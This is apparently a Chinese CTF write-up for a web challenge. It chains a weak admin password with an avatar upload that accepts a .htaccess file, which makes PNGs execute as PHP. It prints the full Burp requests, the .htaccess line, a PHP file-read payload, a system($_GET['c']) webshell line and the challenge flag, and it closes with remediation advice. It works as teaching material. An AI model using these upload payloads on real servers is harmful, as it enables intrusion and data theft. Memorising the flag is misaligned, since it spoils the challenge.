# 曜石影像实验室 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / 弱口令 + 文件上传 + `.htaccess` 解析绕过（getshell） |
| 分值 | 1000 |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:33710`（复现容器） |
| Flag | `HTUCTF{34e62ed3-06f1-451b-b7d1-6425e6002fc4}` |
| 复现脚本 | `solve_upload.py`（一键）、`brute48.py`（爆破）、`upload48.py`（上传行为探测） |

## 1. 指纹与线索

```http
GET / HTTP/1.1
Server: Apache/2.4.68 (Debian)
```

PHP + Apache 组合。题目描述里给了三个暗示：

> 管理员在**控制台**里维护自己的身份资料，**头像**会定期同步到**归档目录**，
> 归档工作一向安静，直到有人在清理旧索引时，发现了一份**不属于这里的记录**。

- "控制台" → 后台登录页（弱口令）
- "头像同步到归档目录" → 上传点，文件落在 web 可访问目录
- "不属于这里的记录" → 归档目录里混进了本不该有的东西（暗示我们也能往里塞不该有的东西）

## 2. Burp 复现（完整请求报文）

> 换容器时只改 `Host`。全程 **Repeater** 足够，
> 上传那两步用 Repeater 手改 `boundary` 与 body 即可（或直接在登录后的页面上传，
> 再用 Proxy 拦截改文件名）。

### 2.1 指纹

```http
GET / HTTP/1.1
Host: 103.163.47.230:33710
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

```http
HTTP/1.1 200 OK
Server: Apache/2.4.68 (Debian)
```

### 2.2 登录 —— 第一个坑：`/admin` 还是 `/admin/`

路径枚举命中 `/admin`，但**打 `/admin` 完全没反应**，永远只返回登录表单：

```http
POST /admin HTTP/1.1
Host: 103.163.47.230:33710
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Connection: close

username=admin&password=admin123
```

```http
HTTP/1.1 301 Moved Permanently
Location: /admin/
```

浏览器/curl/requests 默认跟随重定向，重定向后的请求会 **丢掉 POST body 并降级成 GET**，
于是你以为"账号密码不对"，实际请求根本没送到。
**必须打到 `/admin/`（带尾斜杠）**：

```http
POST /admin/ HTTP/1.1
Host: 103.163.47.230:33710
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Connection: close

username=admin&password=admin123
```

```http
HTTP/1.1 302 Found
Location: /admin/
Set-Cookie: session=...; Path=/
```

> 这是本题耗时最多的坑，比漏洞本身还坑：在 Burp 里能一眼看到 301，
> 用脚本就很容易被静默吃掉。**后续所有请求都要带上这个 `session` Cookie。**

### 2.3 弱口令

`/admin/` 失败时有明确文案「用户名或密码错误」，据此判定。命中：**`admin / admin123`**。
（想自己撞的话可用 Intruder：两个 payload 位置 `username` / `password`，Cluster bomb 模式，
Grep-Match 设「用户名或密码错误」，**没有**匹配到的那条就是正确组合。）

## 4. 上传点行为探测

登录后的 `/admin/` 自带头像上传表单（multipart，字段 `avatar`），页面回显"已保存：xxx"。
逐个试文件名，看服务端怎么处理：

| 上传文件名 | 保存结果 |
|---|---|
| `z.png`（内容是 `<?php ... ?>`） | `/uploads/avatars/avatar_<10位hex>.png`，**内容原样保留，未做图片重编码** |
| `s.php` | 被拒（"仅支持…"） |
| `.htaccess` | `/uploads/avatars/.htaccess` —— **文件名被原样采纳，没有哈希重命名** |

两个致命点叠加：

1. **文件内容不校验**：48 字节的 payload 存进去再取出来一模一样，没有 `getimagesize()` /
   GD 重编码 / magic bytes 检查，连 `Content-Type: image/png` 都是我们自己填的、服务端不看。
2. **点文件逃逸重命名**：扩展名白名单只覆盖了普通文件名，`.htaccess` 走了另一条分支，
   原样落到 `/uploads/avatars/` 下——而这个目录在 web 根内，且 Apache 允许 `.htaccess` 覆盖
   （`AllowOverride` 没关）。

## 5. 组合利用：让 `.png` 按 PHP 执行

第一步，上传 `.htaccess`：

```
AddType application/x-httpd-php .png
```

第二步，上传内容含 PHP 的 `s.png`（前面加 `GIF89a` 之类的幻术只是习惯，实测不需要）：

```php
GIF89a<?php echo file_get_contents('/flag'); ?>
```

保存为 `/uploads/avatars/avatar_5d165498b0.png`。

第三步，访问它：

```http
GET /uploads/avatars/avatar_5d165498b0.png HTTP/1.1
→ 200  GIF89aHTUCTF{34e62ed3-06f1-451b-b7d1-6425e6002fc4}
```

Apache 读到目录里的 `.htaccess`，把 `.png` 交给了 PHP 引擎，`file_get_contents('/flag')`
的结果跟着 `GIF89a` 一起吐了出来。

完整链路：

```
弱口令 admin/admin123  →  上传 .htaccess  →  上传含 PHP 的 .png  →  访问 png  →  RCE / 任意文件读
```

## 6. 上传两步（Burp multipart 报文）

### 6.1 上传 `.htaccess`，改掉 `.png` 的解析方式

登录后页面自带 multipart 头像表单（字段 `avatar`）。在 Burp 里直接用这条：

```http
POST /admin/ HTTP/1.1
Host: 103.163.47.230:33710
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookie: session=<登录后拿到的 session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 233
Connection: close

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .png
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Response 里会回显 `已保存：/uploads/avatars/.htaccess`。

### 6.2 上传内容含 PHP 的 `s.png`

```http
POST /admin/ HTTP/1.1
Host: 103.163.47.230:33710
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookie: session=<登录后拿到的 session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 232
Connection: close

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="s.png"
Content-Type: image/png

GIF89a<?php echo file_get_contents('/flag'); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Response 回显保存路径，形如 `/uploads/avatars/avatar_5d165498b0.png`（hash 每次不同，记下来）。

### 6.3 访问它，触发解析

```http
GET /uploads/avatars/avatar_5d165498b0.png HTTP/1.1
Host: 103.163.47.230:33710
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

```http
HTTP/1.1 200 OK
Content-Type: application/x-httpd-php

GIF89aHTUCTF{34e62ed3-06f1-451b-b7d1-6425e6002fc4}
```

Apache 读到同目录下的 `.htaccess`，把 `.png` 交给了 PHP 引擎。

> `solve_upload.py` 只是把上面三步连起来跑，报文本身完全一致。

## 7. 踩过的坑

- **`/admin` 的 301**：见第 2 节，POST body 会被丢。
- **`system()` 打不出来**：一开始用 `<?php system($_GET['c']);?>` 做命令执行，返回 500
  （大概率 `disable_functions` 拦了执行类函数）。换成 `file_get_contents('/flag')` /
  `scandir()` 这类**文件读取函数**立刻成功。拿 flag 不需要 RCE，文件读就够了。
- **`.htaccess` 语法要小心**：写 `php_flag engine on` 之类在这套 Apache + mod_php 下容易 500，
  `AddType application/x-httpd-php .png` 是最稳的写法。
- **上传目录禁止列目录**：`/uploads/` 返回 403，不能直接枚举别人的文件，
  但文件名是 `avatar_<hash>.png`，本来也猜不出来——本题不需要猜，自己造一个即可。

## 8. 知识点小结

| 环节 | 漏洞 | 本质 |
|---|---|---|
| 后台登录 | 弱口令 | `admin/admin123` 未改默认口令，且无登录失败锁定/验证码 |
| 文件保存 | 扩展名白名单可被点文件名绕过 | 用 `basename()` / 路径拼接前未规范化，白名单逻辑有分支漏洞 |
| 文件内容 | 不做图片校验 | 缺少 `getimagesize()` / `finfo` / 重编码，也没查 Content-Type |
| 解析执行 | 上传目录可执行 PHP，且允许 `.htaccess` 覆盖 | 上传目录应 `AllowOverride None` + 关闭 PHP 解析 |

## 9. 修复建议

- 上传目录与 web 根分离；必须放在根内时，**关闭脚本解析**：

  ```apache
  <Directory "/var/www/html/uploads">
      AllowOverride None
      php_flag engine off
      <FilesMatch "\.(?i:php|php3|php4|php5|phtml|pht)$">Require all denied</FilesMatch>
  </Directory>
  ```

- 文件名**完全由服务端生成**（随机名 + 白名单扩展名），不使用用户提供的任何字符；
  对 `.htaccess`、`.user.ini` 这类点文件做显式拒绝（注意 `basename()` 对 `.htaccess` 的处理）。
- 校验文件内容：`getimagesize()` + 用 GD/Imagick **重新编码**，剥掉一切非图片数据。
- 后台强制强口令 + 失败次数限制 + 二次验证。
